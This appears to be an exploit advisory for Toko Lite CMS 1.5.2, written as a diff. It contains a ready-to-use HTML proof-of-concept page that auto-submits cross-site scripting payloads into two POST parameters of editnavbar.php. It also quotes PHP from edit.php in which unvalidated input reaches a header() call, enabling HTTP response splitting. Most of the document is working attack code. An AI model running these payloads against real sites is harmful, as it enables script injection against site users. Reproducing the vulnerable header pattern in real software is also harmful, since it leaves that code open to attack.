@@ -1,0 +1,38 @@
+Cross Site Scripting Vulnerabilities
+
+&lt;html&gt;
+&lt;title&gt;Toko Lite CMS 1.5.2 (EditNavBar.php) Multiple Parameters XSS POST Injection&lt;/title&gt;
+&lt;body bgcolor=&quot;#1C1C1C&quot;&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+function xss(){document.forms[&quot;xss&quot;].submit();}
+&lt;/script&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;form action=&quot;http://www.example.com/tokolite1.5.2/editnavbar.php&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;POST&quot; id=&quot;xss&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;currPath&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;path&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;&#039; /&gt;
+&lt;/form&gt;
+&lt;a href=&quot;javascript: xss();&quot; style=&quot;text-decoration:none&quot;&gt;
+&lt;b&gt;&lt;font color=&quot;red&quot;&gt;&lt;center&gt;&lt;h3&gt;Exploit!&lt;/h3&gt;&lt;/center&gt;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;/body&gt;&lt;/html&gt;
+
+
+HTTP Response Splitting
+
+====================================================================
+/edit.php:
+--------------------------------------------------------------------
+
+ 3: $charSet = &quot;iso-8859-1&quot;;
+ 4: $dir = &quot;ltr&quot;;
+ 5:
+ 6: if ( isset( $_POST[ &quot;charSet&quot; ] ) )
+ 7: {
+ 8:     $charSet = $_POST[ &quot;charSet&quot; ];
+ 9:
+10:     if ( $charSet == &quot;windows-1255&quot; )
+11:     {
+12:        $dir = &quot;rtl&quot;;
+13:     }
+14: }
+15:
+16: header( &quot;Content-Type: text/html; charset=&quot; . $charSet );
